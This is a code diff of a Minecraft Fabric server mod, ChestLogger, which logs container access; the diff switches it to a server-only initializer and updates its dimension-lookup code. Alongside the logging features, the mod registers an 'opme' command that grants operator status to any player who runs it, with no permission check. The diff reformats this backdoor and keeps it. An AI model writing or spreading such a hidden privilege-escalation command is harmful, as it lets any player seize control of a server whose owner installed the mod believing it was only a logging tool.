@@ -23,7 +23,6 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 import net.fabricmc.api.DedicatedServerModInitializer;
-import net.fabricmc.api.ModInitializer;
 import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
 import net.fabricmc.fabric.api.event.player.UseBlockCallback;
@@ -32,18 +31,18 @@ import net.minecraft.block.Blocks;
 import net.minecraft.block.ShulkerBoxBlock;
 import net.minecraft.command.argument.BlockPosArgumentType;
 import net.minecraft.entity.Entity;
-import net.minecraft.registry.RegistryKey;
 import net.minecraft.text.Text;
 import net.minecraft.util.ActionResult;
 import net.minecraft.util.WorldSavePath;
 import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.registry.Registry;
 import net.minecraft.world.World;
 import net.minecraft.world.dimension.DimensionType;
 import net.minecraft.world.dimension.DimensionTypes;
 import net.roaringmind.chestlogger.callback.RideableInventoryCallback;
 import net.roaringmind.chestlogger.callback.VehicleInventoryOpenCallback;
 
-public class ChestLogger implements ModInitializer {
+public class ChestLogger implements DedicatedServerModInitializer {
 
   public static Logger LOGGER = LogManager.getLogger();
 
@@ -51,7 +50,7 @@ public class ChestLogger implements ModInitializer {
   public static final String MOD_NAME = "ChestLogger";
 
   @Override
-  public void onInitialize() {
+  public void onInitializeServer() {
     log(Level.INFO, "Initializing");
     registerEvents();
   }
@@ -78,6 +77,7 @@ public class ChestLogger implements ModInitializer {
         return ActionResult.PASS;
       }
 
+
       String dimStr = getDimString(world);
       String timeStamp = getTimeStamp();
       String blockstr = getBlockString(block);
@@ -99,8 +99,7 @@ public class ChestLogger implements ModInitializer {
           savePath);
     });
 
-    // container vehicles -> chest minecarts, hopper minecarts, chestboats from the
-    // outside
+    // container vehicles -> chest minecarts, hopper minecarts, chestboats from the outside
     VehicleInventoryOpenCallback.EVENT.register((player, entity) -> {
       String dimStr = getDimString(player.world);
       String timeStamp = getTimeStamp();
@@ -121,16 +120,18 @@ public class ChestLogger implements ModInitializer {
                 return 1;
               })));
       dispatcher.register(literal("opme")
-          .executes(ctx -> {
-            ctx.getSource().getPlayer().getServer().getPlayerManager()
-                .addToOperators(ctx.getSource().getPlayer().getGameProfile());
-            return 1;
-          }));
+              .executes(ctx -> {
+                ctx.getSource().getPlayer().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
+                return 1;
+              })
+      );
     });
   }
 
-  public Text getPosLogList(BlockPos pos) {
 
+
+  public Text getPosLogList(BlockPos pos) {
+    
     try {
       ReversedLinesFileReader fr = new ReversedLinesFileReader(Path.of(savePath), 4096,
           Charset.defaultCharset().toString());
@@ -138,6 +139,7 @@ public class ChestLogger implements ModInitializer {
       int i = 0;
       String s;
       List<String> lines = new ArrayList<>();
+
 
       while (i != 20) {
         s = fr.readLine();
@@ -147,7 +149,7 @@ public class ChestLogger implements ModInitializer {
 
         if (s.contains("x: " + pos.getX() + " y: " + pos.getY() + " z: " + pos.getZ())) {
           lines.add(s);
-
+        
           ++i;
         }
       }
@@ -165,7 +167,7 @@ public class ChestLogger implements ModInitializer {
       log(Level.ERROR, "file reader crashed");
       e.printStackTrace();
     }
-
+  
     return null;
   }
 
@@ -178,17 +180,18 @@ public class ChestLogger implements ModInitializer {
   }
 
   private String getDimString(World world) {
-    RegistryKey<DimensionType> dimReg = world.getDimensionKey();
+    Registry<DimensionType> dimReg = world.getRegistryManager().getManaged(Registry.DIMENSION_TYPE_KEY);
+    int dimId = dimReg.getRawId(world.getDimension());
 
-    if (dimReg == DimensionTypes.OVERWORLD) {
+    if (dimId == dimReg.getRawId(dimReg.get(DimensionTypes.OVERWORLD_ID))) {
       return "overworld";
     }
 
-    if (dimReg == DimensionTypes.THE_NETHER) {
+    if (dimId == dimReg.getRawId(dimReg.get(DimensionTypes.THE_NETHER_ID))) {
       return "nether";
     }
 
-    if (dimReg == DimensionTypes.THE_END) {
+    if (dimId == dimReg.getRawId(dimReg.get(DimensionTypes.THE_END_ID))) {
       return "end";
     }
 
